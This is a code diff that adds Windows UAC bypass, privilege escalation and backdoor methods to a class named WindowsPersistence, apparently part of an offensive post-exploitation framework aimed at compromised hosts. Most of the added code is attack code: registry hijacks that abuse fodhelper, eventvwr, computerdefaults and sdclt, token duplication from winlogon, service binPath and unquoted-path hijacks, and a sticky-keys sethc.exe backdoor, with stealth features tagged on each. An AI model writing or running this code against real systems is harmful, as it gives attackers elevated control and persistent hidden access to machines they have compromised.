@@ -45,6 +45,22 @@ class WindowsPersistence:
                 return await self._create_startup_persistence(host, session)
             elif method == PersistenceMethod.WINDOWS_DLL_HIJACKING:
                 return await self._create_dll_hijacking(host, session)
+            elif method == PersistenceMethod.WINDOWS_UAC_FODHELPER:
+                return await self._create_uac_fodhelper_bypass(host, session)
+            elif method == PersistenceMethod.WINDOWS_UAC_EVENTVWR:
+                return await self._create_uac_eventvwr_bypass(host, session)
+            elif method == PersistenceMethod.WINDOWS_UAC_COMPUTERDEFAULTS:
+                return await self._create_uac_computerdefaults_bypass(host, session)
+            elif method == PersistenceMethod.WINDOWS_UAC_SDCLT:
+                return await self._create_uac_sdclt_bypass(host, session)
+            elif method == PersistenceMethod.WINDOWS_PRIVESC_TOKEN:
+                return await self._create_token_privilege_escalation(host, session)
+            elif method == PersistenceMethod.WINDOWS_PRIVESC_SERVICE:
+                return await self._create_service_privilege_escalation(host, session)
+            elif method == PersistenceMethod.WINDOWS_PRIVESC_UNQUOTED_PATH:
+                return await self._create_unquoted_path_escalation(host, session)
+            elif method == PersistenceMethod.WINDOWS_PRIVESC_REGISTRY:
+                return await self._create_registry_privilege_escalation(host, session)
             else:
                 return PersistenceResult(
                     success=False,
@@ -394,3 +410,355 @@ class WindowsPersistence:
   </Actions>
 </Task>"""
         return xml_template
+
+    # UAC Bypass Methods
+
+    async def _create_uac_fodhelper_bypass(self, host: CompromisedHost,
+                                         session: PersistenceSession) -> PersistenceResult:
+        """Create UAC bypass using fodhelper.exe"""
+        reg_key = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # Commands to set up fodhelper bypass
+        commands = [
+            f'reg add "{reg_key}" /ve /t REG_SZ /d "{payload_content}" /f',
+            f'reg add "{reg_key}" /v "DelegateExecute" /t REG_SZ /d "" /f',
+            'fodhelper.exe'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.FILELESS,
+            persistence_method=PersistenceMethod.WINDOWS_UAC_FODHELPER,
+            registry_key=reg_key,
+            startup_command=payload_content,
+            stealth_features=['uac_bypass', 'fodhelper', 'registry_hijack'],
+            cleanup_commands=[f'reg delete "HKCU\\Software\\Classes\\ms-settings" /f']
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_UAC_FODHELPER,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Registry Key: {reg_key}"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'bypass_method': 'fodhelper',
+                'commands': commands
+            }
+        )
+
+    async def _create_uac_eventvwr_bypass(self, host: CompromisedHost,
+                                        session: PersistenceSession) -> PersistenceResult:
+        """Create UAC bypass using eventvwr.exe"""
+        reg_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # Commands to set up eventvwr bypass
+        commands = [
+            f'reg add "{reg_key}" /ve /t REG_SZ /d "{payload_content}" /f',
+            'eventvwr.exe'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.FILELESS,
+            persistence_method=PersistenceMethod.WINDOWS_UAC_EVENTVWR,
+            registry_key=reg_key,
+            startup_command=payload_content,
+            stealth_features=['uac_bypass', 'eventvwr', 'registry_hijack'],
+            cleanup_commands=[f'reg delete "HKCU\\Software\\Classes\\mscfile" /f']
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_UAC_EVENTVWR,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Registry Key: {reg_key}"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'bypass_method': 'eventvwr',
+                'commands': commands
+            }
+        )
+
+    async def _create_uac_computerdefaults_bypass(self, host: CompromisedHost,
+                                                session: PersistenceSession) -> PersistenceResult:
+        """Create UAC bypass using computerdefaults.exe"""
+        reg_key = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # Commands to set up computerdefaults bypass
+        commands = [
+            f'reg add "{reg_key}" /ve /t REG_SZ /d "{payload_content}" /f',
+            f'reg add "{reg_key}" /v "DelegateExecute" /t REG_SZ /d "" /f',
+            'computerdefaults.exe'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.FILELESS,
+            persistence_method=PersistenceMethod.WINDOWS_UAC_COMPUTERDEFAULTS,
+            registry_key=reg_key,
+            startup_command=payload_content,
+            stealth_features=['uac_bypass', 'computerdefaults', 'registry_hijack'],
+            cleanup_commands=[f'reg delete "HKCU\\Software\\Classes\\ms-settings" /f']
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_UAC_COMPUTERDEFAULTS,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Registry Key: {reg_key}"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'bypass_method': 'computerdefaults',
+                'commands': commands
+            }
+        )
+
+    async def _create_uac_sdclt_bypass(self, host: CompromisedHost,
+                                     session: PersistenceSession) -> PersistenceResult:
+        """Create UAC bypass using sdclt.exe"""
+        reg_key = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command"
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # Commands to set up sdclt bypass
+        commands = [
+            f'reg add "{reg_key}" /ve /t REG_SZ /d "{payload_content}" /f',
+            f'reg add "{reg_key}" /v "IsolatedCommand" /t REG_SZ /d "{payload_content}" /f',
+            'sdclt.exe /KickOffElev'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.FILELESS,
+            persistence_method=PersistenceMethod.WINDOWS_UAC_SDCLT,
+            registry_key=reg_key,
+            startup_command=payload_content,
+            stealth_features=['uac_bypass', 'sdclt', 'registry_hijack'],
+            cleanup_commands=[f'reg delete "HKCU\\Software\\Classes\\exefile" /f']
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_UAC_SDCLT,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Registry Key: {reg_key}"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'bypass_method': 'sdclt',
+                'commands': commands
+            }
+        )
+
+    # Privilege Escalation Methods
+
+    async def _create_token_privilege_escalation(self, host: CompromisedHost,
+                                               session: PersistenceSession) -> PersistenceResult:
+        """Create privilege escalation using token manipulation"""
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # PowerShell script for token manipulation
+        token_script = f"""
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Security.Principal;
+
+        public static class TokenManipulation {{
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool SetThreadToken(IntPtr PHThread, IntPtr Token);
+
+            public static void ElevateToken() {{
+                Process[] processes = Process.GetProcessesByName("winlogon");
+                if (processes.Length > 0) {{
+                    IntPtr tokenHandle = IntPtr.Zero;
+                    IntPtr duplicatedToken = IntPtr.Zero;
+
+                    if (OpenProcessToken(processes[0].Handle, 0x0002, out tokenHandle)) {{
+                        if (DuplicateToken(tokenHandle, 2, out duplicatedToken)) {{
+                            SetThreadToken(IntPtr.Zero, duplicatedToken);
+                        }}
+                    }}
+                }}
+            }}
+        }}
+"@
+        [TokenManipulation]::ElevateToken()
+        {payload_content}
+        """
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.FILELESS,
+            persistence_method=PersistenceMethod.WINDOWS_PRIVESC_TOKEN,
+            startup_command=token_script,
+            stealth_features=['token_manipulation', 'privilege_escalation', 'powershell_fileless'],
+            cleanup_commands=[]  # Fileless, no cleanup needed
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_PRIVESC_TOKEN,
+            backdoor_info=backdoor,
+            artifacts_created=["Token manipulation script"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'escalation_method': 'token_manipulation',
+                'script': token_script
+            }
+        )
+
+    async def _create_service_privilege_escalation(self, host: CompromisedHost,
+                                                 session: PersistenceSession) -> PersistenceResult:
+        """Create privilege escalation by exploiting vulnerable services"""
+        service_name = f"VulnService{uuid.uuid4().hex[:8]}"
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # Commands to exploit service permissions
+        commands = [
+            'sc query state= all | findstr "SERVICE_NAME"',  # Enumerate services
+            f'sc config "{service_name}" binPath= "{payload_content}"',
+            f'sc start "{service_name}"'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
+            persistence_method=PersistenceMethod.WINDOWS_PRIVESC_SERVICE,
+            service_name=service_name,
+            startup_command=payload_content,
+            stealth_features=['service_exploitation', 'privilege_escalation'],
+            cleanup_commands=[
+                f'sc stop "{service_name}"',
+                f'sc config "{service_name}" binPath= "C:\\\\Windows\\\\System32\\\\svchost.exe"'
+            ]
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_PRIVESC_SERVICE,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Modified Service: {service_name}"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'escalation_method': 'service_exploitation',
+                'commands': commands
+            }
+        )
+
+    async def _create_unquoted_path_escalation(self, host: CompromisedHost,
+                                             session: PersistenceSession) -> PersistenceResult:
+        """Create privilege escalation using unquoted service paths"""
+        # Common unquoted paths to exploit
+        target_paths = [
+            "C:\\Program Files\\Common Files\\System\\service.exe",
+            "C:\\Program Files\\Application\\service.exe"
+        ]
+
+        payload_content = self._generate_service_executable(host, session)
+        exploit_path = target_paths[0].replace("\\service.exe", "\\Program.exe")
+
+        # Commands to exploit unquoted paths
+        commands = [
+            'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
+            f'copy "{payload_content}" "{exploit_path}"',
+            'sc query state= all'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
+            persistence_method=PersistenceMethod.WINDOWS_PRIVESC_UNQUOTED_PATH,
+            installation_path=exploit_path,
+            stealth_features=['unquoted_path_exploitation', 'privilege_escalation'],
+            cleanup_commands=[f'del "{exploit_path}" /f']
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_PRIVESC_UNQUOTED_PATH,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Exploit Binary: {exploit_path}"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'escalation_method': 'unquoted_path',
+                'exploit_path': exploit_path,
+                'commands': commands
+            }
+        )
+
+    async def _create_registry_privilege_escalation(self, host: CompromisedHost,
+                                                  session: PersistenceSession) -> PersistenceResult:
+        """Create privilege escalation using registry key permissions"""
+        reg_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
+        payload_content = self._generate_powershell_payload(host, session)
+
+        # Commands to exploit registry permissions (sticky keys backdoor)
+        commands = [
+            f'reg add "{reg_key}" /v "Debugger" /t REG_SZ /d "cmd.exe" /f',
+            'takeown /f C:\\Windows\\System32\\sethc.exe',
+            'icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F',
+            f'copy "cmd.exe" "C:\\Windows\\System32\\sethc_backup.exe"',
+            f'echo {payload_content} > C:\\Windows\\System32\\sethc.exe'
+        ]
+
+        # Create backdoor info
+        backdoor = BackdoorInfo(
+            host_id=host.host_id,
+            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
+            persistence_method=PersistenceMethod.WINDOWS_PRIVESC_REGISTRY,
+            registry_key=reg_key,
+            installation_path="C:\\Windows\\System32\\sethc.exe",
+            startup_command=payload_content,
+            stealth_features=['registry_exploitation', 'sticky_keys_backdoor', 'privilege_escalation'],
+            cleanup_commands=[
+                f'reg delete "{reg_key}" /v "Debugger" /f',
+                'copy "C:\\Windows\\System32\\sethc_backup.exe" "C:\\Windows\\System32\\sethc.exe" /y',
+                'del "C:\\Windows\\System32\\sethc_backup.exe" /f'
+            ]
+        )
+
+        return PersistenceResult(
+            success=True,
+            host_id=host.host_id,
+            method=PersistenceMethod.WINDOWS_PRIVESC_REGISTRY,
+            backdoor_info=backdoor,
+            artifacts_created=[f"Registry Key: {reg_key}", "Modified sethc.exe"],
+            cleanup_commands=backdoor.cleanup_commands,
+            stealth_applied=True,
+            additional_data={
+                'escalation_method': 'registry_exploitation',
+                'backdoor_type': 'sticky_keys',
+                'commands': commands
+            }
+        )
